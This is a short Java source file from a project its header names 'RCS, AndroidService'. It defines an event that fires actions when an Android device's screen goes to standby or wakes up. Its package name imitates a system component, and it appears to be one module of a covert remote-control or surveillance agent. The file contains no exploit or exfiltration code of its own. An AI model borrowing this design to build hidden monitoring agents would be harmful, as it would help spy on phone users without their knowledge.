/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventStandby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.event;

import java.io.IOException;

import com.android.networking.Standby;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfEvent;
import com.android.networking.interfaces.Observer;
import com.android.networking.listener.ListenerStandby;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;

public class EventStandby extends BaseEvent implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "EventStandby"; //$NON-NLS-1$

	private int actionOnEnter, actionOnExit;

	@Override
	public void actualStart() {
		ListenerStandby.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerStandby.self().detach(this);
		onExit(); // di sicurezza
	}

	@Override
	public boolean parse(ConfEvent event) {
		return true;
	}

	@Override
	public void actualGo() {

	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Standby s) {
		// Stato dello schermo ON/OFF
		if (s.getStatus() == true) {
			// SCREEN ON
			onExit();
		} else {
			// STANDBY
			onEnter();
		}

		return 0;
	}
}